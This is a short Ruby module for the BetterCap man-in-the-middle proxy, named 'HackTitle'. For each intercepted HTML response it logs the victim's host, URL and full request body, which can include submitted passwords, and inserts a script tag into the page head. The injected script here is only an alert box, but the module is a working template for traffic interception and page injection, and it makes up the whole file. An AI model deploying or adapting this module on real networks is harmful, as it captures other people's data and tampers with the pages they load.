#!/usr/bin/env ruby

class HackTitle < BetterCap::Proxy::HTTP::Module
  meta(
    'Name'        => 'ex',
  )
  def on_request( request, response )
    if response.content_type =~ /^text\/html.*/
      BetterCap::Logger.info "Hacking http://#{request.host}#{request.url}"
      BetterCap::Logger.info request.body
      response.body.sub!( '<head>', '<head><script> window.alert("ok?"); </script>' )
    end
  end
end
